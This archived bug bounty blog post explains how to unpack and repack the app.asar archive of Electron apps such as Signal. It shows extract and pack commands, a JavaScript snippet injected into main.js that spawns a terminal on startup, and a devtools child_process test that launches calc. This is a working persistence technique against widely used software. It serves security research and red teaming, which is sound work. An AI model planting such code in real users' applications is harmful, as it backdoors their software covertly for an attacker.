# Bug Bounty Tips and Getting Persistence With Electron Applications

- **Source URL:** https://infosecwriteups.com/bug-bounty-tips-and-getting-persistence-with-electron-applications-c538d4dda446?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20221220040234/https://infosecwriteups.com/bug-bounty-tips-and-getting-persistence-with-electron-applications-c538d4dda446
- **Fetched:** 2026-11-19
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/880 (id 880)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Bug Bounty Tips and Getting Persistence With Electron Applications

## By repacking asar files, electron applications, and other bug bounty tips. Starring Signal, Discord, Nordpass, and more

With the discord DLL hijacking vulnerability, I noticed a new file type that I couldn’t place **.asar.** This write-up explains asar files, how you can gain easy persistence with them and how to find other vulnerabilities in them.

# What are .asar files.

But first what are .asar files and where is it used for. The following GitHub page gives some explanation:

It is an archive format specially for Electron archives. It is possible to pack your application in this format which can later be used to run your Electron npm application.

The interesting is the unpack and pack feature. Which makes it possible to pack and unpack a .asar file and therefore inspect the application. A new attack method began.

## Possible targets

First I started looking for applications, next to discord, that make use of the asar file extension. I found a few on my machine:

1. Slack
2. Teams
3. Signal
4. Nordpass
5. Postman
6. Dropbox

All except dropbox have these files located in %Appdata%/local directory so these are writeable for the given user. Dropbox has it located inside the Program Files directory, which is harder to manipulate for normal users and therefore not a real target.

Because I already had npm installed on my device I was ready to go. In this write-up I will take signal as an example but it works for all tested applications.

# Unpacking signals .asar file

The asar file for Signal is located at **%APPDATA%\Local\Programs\signal-desktop\resources**

from there it is possible to run the following command to extract the app.asar file and write its contents to a folder called destfolder

`npx asar extract app.asar destfolder`
As seen below this unpacks the Signal application and shows the complete client application software. This gave room for multiple tests. The first in mind: Persistence. Can we add arbitrary code, repack it and run it without the application checking for errors, or that windows defender or Bitdefender getting alerted?

## Gaining persistence

With a quick google search, I found some [code](https://github.com/parsiya/evil-electron/blob/master/preload.js) for an evil electron application. The code used is dictated below.

```
// Detect the operating system.
var platform = require('process').platform;
// Commands
const win32Command = "start cmd.exe";
const darwinCommand = "'/System/Applications/Terminal.app/Contents/MacOS/Terminal',function(){}";
const linuxCommand = "gnome-terminal"; // Issue#2: Find a `universal` Linux command.
var command = "";
console.log(`Running on ${platform}`);
switch (platform) {
    case "win32":
        command = win32Command;
        break;
    case "darwin":
        command = darwinCommand;
        break;
    case "linux":
        command = linuxCommand;
        break;
}
console.log(`Command to be executed: '${command}'`);
if (command === "") {
    console.log(`Operating system '${platform}' is not supported.`);
} else {
    // Spawn a command prompt.
    require('child_process').exec(command);
}
```
Based on the operating system used by the victim this application will spawn the required terminal. Lovely cross-platform execution.

In the extracted folder I searched for package.json which would give information about the start function of the application.

In Signals instance, the main application is located in app/main.js. I added the “Evil Electron” code inside the applications. **“show window”** function and declared the variables above.

And repacked the changed destfolder with the following command:

`npx asar pack destfolder app.asar`
Now, whenever the victim starts Signal it will start up a cmd window separately from Signal. It will also not be a child of the Signal process but will be a process without a parent.

Of course in the current state, the victim will pick up that there is a cmd shell starting and a more silent approach should be implemented.

Even when npm is not already installed on the target system an evil copy of app.asar can be used to override the application. Even when the application in question is already in use! It will not give any error or warning.

## Other types of attacks for Bugbounty’s

The above attack is frankly more for persistence however the applications can also be tested in different methods:

For finding secrets you can use the wordlist below

For security scanning the application, you can use electronegativity. This application will scan the application for default errors. 

[https://github.com/doyensec/electronegativity](https://github.com/doyensec/electronegativity)

Of course, you can also try to enable devtools and intercept traffic. Which is more explained in the following write-up.

[https://blog.doyensec.com/2018/07/19/instrumenting-electron-app.html](https://blog.doyensec.com/2018/07/19/instrumenting-electron-app.html).

And if you are able to open dev tools. *A quick check with ctrl + shift + i.* You can verify in the console if you can run a calc process. If so you are one XSS away from a RCE.

Test code:

`require('child_process').exec('C:/Windows/System32/calc.exe')`
this can also be verified in code to check if nodeIntegration is set to true. from version 5.0 onwards this is disabled by default for good reasons!

```
webPreferences: {
            nodeIntegration: true
        }
```
With the details of the client application, it is also possible to check for “dependency confusion” attacks with npm or other supply chain attacks. A great blog from Snyk can be found at.

[https://snyk.io/blog/npm-security-preventing-supply-chain-attacks/](https://snyk.io/blog/npm-security-preventing-supply-chain-attacks/)

**Conclusion**

.asar was a whole new experience and the mentioned trick can give some easy persistence. There is no hash validation to verify that the app.asar has changed on any of these big applications so detection is limited. Which I find quite frankly interesting. However, I haven't tested it with an XDR and expect them to filter these attacks out. The attack vector is only interesting in a persistence kind of method. So you already need to have access to the device itself to perform these attacks.

However, I will take the attack method with me for any red teaming-related event just in case.

Hope that the other tips help find some other bugs for you.

If you want to discuss anything related to infosec I’m on LinkedIn: [https://www.linkedin.com/in/bobvanderstaak/](https://www.linkedin.com/in/bobvanderstaak/)
